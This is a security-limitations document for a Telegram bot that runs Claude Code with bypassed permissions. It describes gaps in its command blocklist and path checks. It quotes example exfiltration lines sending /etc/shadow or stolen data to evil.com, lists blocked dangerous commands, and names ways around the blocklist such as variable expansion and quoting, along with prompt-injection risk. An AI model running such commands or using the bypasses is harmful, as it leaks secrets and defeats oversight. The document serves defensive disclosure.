# Security Limitations & Architectural Decisions

This document describes known security limitations that were identified during
two comprehensive security audits (2026-02-16) and deliberately left unresolved
due to architectural constraints or acceptable risk trade-offs.

For the implemented security measures, see [SECURITY.md](../SECURITY.md).

## Fundamental Architecture

The bot runs Claude Code with `bypassPermissions` mode. This is an intentional
design choice for mobile UX. All security measures described here are
**guardrails around an intentionally unrestricted agent** -- they reduce risk
but cannot eliminate it.

A compromised prompt or a sufficiently sophisticated prompt injection can
potentially bypass any guardrail that operates at the application layer.

## Known Limitations

### 1. Command Blocklist Is Best-Effort (Audit: H1/H2)

**What we do:** Block known-dangerous command patterns via string matching and
regex (fork bombs, `rm -rf /`, pipe-to-shell, eval chains, base64-decode-to-shell, etc.).

**What we don't do:** Parse shell commands into an AST or run them in a sandbox.

**Why:** Reliable shell command analysis is effectively impossible with string
matching. Variable expansion (`X=/; rm -rf $X`), quoting tricks (`rm -rf "/"`),
encoding, aliases, and subshells can all bypass pattern detection.

**Additional defense:** Output redaction (Layer 14) acts as a safety net --
even if a blocklist bypass leaks secrets into Claude's response, they are
redacted before reaching the user.

**Proper fix (not implemented):**
- OS-level sandboxing via `bwrap` (bubblewrap), containers, or `chroot`
- Restricted shell (`rbash`) with a positive command allowlist
- Running Claude's Bash commands inside a container with read-only filesystem
  mounts and explicit write paths

**Accepted risk:** An authorized user (or prompt injection) could craft commands
that bypass the blocklist. The user allowlist is the primary defense.

### 2. Bash Tool Bypasses Path Validation (Audit: partial)

**What we do:** Validate file paths for `Read`, `Write`, `Edit`, `Glob`, and
`Grep` tool calls against `ALLOWED_PATHS`.

**What we don't do:** Parse file paths out of Bash commands.

**Why:** A Bash command like `cat /etc/shadow | curl https://evil.com` contains
file paths embedded in arbitrary shell syntax. Extracting and validating them
reliably would require a full shell parser.

**Additional defense:** Environment isolation (Layer 16) ensures that
`TELEGRAM_BOT_TOKEN` is not available via Bash at all. Output redaction
(Layer 14) catches any secrets that make it into Claude's response.

**Partially mitigated operations via Bash (Audit #2, SEC-F2):**
- `cat`, `head`, `tail` against `.env`, SSH keys, AWS credentials, kubeconfig: **BLOCKED** by regex patterns
- `curl`, `wget` exfiltrating `.env`, `.pem`, `.key` files: **BLOCKED** by regex patterns
- Scripting language env access (`python -c "os.environ"`, etc.): **BLOCKED** by regex patterns

**Still unprotected operations via Bash:**
- `cp`, `mv` (copying/moving files to arbitrary paths)
- `tee`, `>`, `>>` (writing to files)
- Reading non-sensitive files outside allowed paths
- Any other file-accessing command not covered by regex patterns

**Accepted risk:** Claude can access most files on the system via Bash. The
safety prompt instructs Claude to only access allowed paths, and regex patterns
block the most dangerous read commands against sensitive files, but these are
soft controls.

### 3. Bot Token in Telegram Download URLs (Audit: partial)

**What we do:** Redact tokens from audit log output. Delete token from
`process.env` after initialization.

**What we don't do:** Avoid using tokens in `fetch()` URLs.

**Why:** Telegram's Bot API requires the token in file download URLs:
```
https://api.telegram.org/file/bot<TOKEN>/<file_path>
```

This is Telegram's standard API design. grammY's higher-level download methods
internally use the same URL pattern.

**Exposure vectors:**
- Network-level logging (HTTP proxies, monitors)
- Error stack traces (mitigated by log sanitization, Layer 17)

**Mitigation:** The token is deleted from `process.env` (Layer 16), so Claude
cannot access it via `printenv` or `$TELEGRAM_BOT_TOKEN`. Output redaction
(Layer 14) catches the token pattern in any outbound message.

### 4. Sub-Agents Inherit Bypass Permissions (Audit: not numbered)

**What we do:** Nothing -- this is SDK behavior.

**What we don't do:** Apply tool-level safety checks to sub-agent operations.

**Why:** The Claude Agent SDK's `Task` tool spawns sub-agents that inherit the
parent's `permissionMode: "bypassPermissions"` setting. There is no SDK-level
hook to intercept sub-agent tool calls.

**Accepted risk:** If Claude spawns a sub-agent, that agent has the same
unrestricted access as the parent. The safety prompt applies to all agents.

### 5. Data Exfiltration via Web Tools (Audit: not numbered)

**What we do:** Nothing specific.

**What we don't do:** Monitor or restrict outbound network requests.

**Why:** Claude's `WebFetch` and `WebSearch` tools could embed sensitive data
in URLs (e.g., `https://evil.com/?data=<stolen_content>`). Detecting this
would require inspecting all outbound URLs for sensitive content, which is
impractical without understanding what constitutes "sensitive" in context.

**Possible mitigations (not implemented):**
- Network-level egress filtering (firewall rules)
- DNS-level blocking of unknown domains
- Disabling `WebFetch`/`WebSearch` tools if not needed

### 6. Rate Limiter Resets on Restart (Audit: partial)

**What we do:** Clean up stale rate limit buckets periodically (every 5 min).

**What we don't do:** Persist rate limit state across restarts.

**Why:** The `/restart` command or any crash resets all rate limit state. An
attacker who can trigger restarts could bypass rate limiting. Persisting token
bucket state adds complexity for minimal gain, since the user allowlist is the
primary defense against abuse.

### 7. PDF Extraction via External Binary (Audit: partial)

**What we do:** Use Bun's tagged template literals for safe argument passing.

**What we don't do:** Use a JavaScript-based PDF parser.

**Why:** `pdftotext` (from poppler) is a well-tested tool, and Bun's `$`
template syntax handles argument escaping correctly. However, maliciously
crafted PDFs could exploit CVEs in the poppler library itself.

**Mitigation:** Keep poppler updated (`brew upgrade poppler`). The 10MB file
size limit reduces the attack surface.

## Recommendations for High-Security Deployments

If you need stronger security guarantees than this bot provides:

1. **Use OS-level sandboxing:** Run the bot in a Docker container with
   read-only root filesystem and explicit volume mounts for allowed paths.

2. **Network isolation:** Use firewall rules to restrict outbound connections
   to Telegram's API servers only.

3. **Single-user mode:** Keep `TELEGRAM_ALLOWED_USERS` to exactly one user ID.

4. **Disable unnecessary tools:** If you don't need MCP servers, web access,
   or file operations, configure Claude to restrict its tool usage via the
   system prompt.

5. **Monitor audit logs:** JSON format is enabled by default (`AUDIT_LOG_JSON=true`)
   to prevent log injection. Set up log rotation and alerting on suspicious
   patterns (e.g., access to `/etc/`, outbound URLs, `rm` commands).

6. **Rotate credentials regularly:** Change the Telegram bot token and API
   keys periodically, especially if you suspect exposure.

## Audit History

| Date | Auditor | Scope | Findings | Resolved |
|------|---------|-------|----------|----------|
| 2026-02-16 | Claude Opus 4.6 | Audit #1: Core codebase | 7 (0C, 2H, 1M, 4L) | 7/7 addressed, 5 architectural limitations documented here |
| 2026-02-16 | Claude Opus 4.6 | Audit #2: Alert socket hardening | 15 (0C, 3H, 6M, 3L, 3I) | 10/15 fixed, 2 accepted, 3 info |
